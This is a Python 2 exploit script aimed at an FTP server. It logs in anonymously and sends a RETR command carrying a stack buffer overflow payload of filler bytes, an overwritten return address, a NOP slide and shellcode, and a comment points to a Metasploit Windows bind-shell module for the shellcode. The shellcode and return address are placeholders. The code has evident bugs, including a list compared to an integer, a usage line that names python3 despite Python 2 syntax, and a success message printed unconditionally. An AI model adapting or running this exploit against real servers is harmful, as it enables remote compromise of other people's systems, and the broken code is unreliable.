import socket
import sys
import time
import struct


def main():
    if sys.argv < 2:
        print "Usage:python3 %s target_ip cmd"%sys.argv[0]
        sys.exit(0)
    else:
        tar = sys.argv[1]
        cmd = sys.argv[2]

        shell_code = ("\xbf\x5c\x2a\x11") #can be created using metasploitable MS windows shell bind tcp module
        EIP = struct.pack('<L',0x7) #use to change Return adddress
        overflow = '\x41'*246    #stack overflow
        NOP_slide = '\x90'*150  #NOP, keep it sliding until shellcode
        attack = overflow+EIP+NOP_slide+shell_code

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((tar,21))
            s.send('USER anonymous\r\n')
            s.recv(1024)
            s.send('PASS \r\n')
            s.recv(1024)
            s.send("RETR"+""+attack+"\r\n")
            time.sleep(5)
        except:
            print "connection failed"
            sys.exit(0)

        print "attack succeeded"


if __name__ == '__main__':
    main()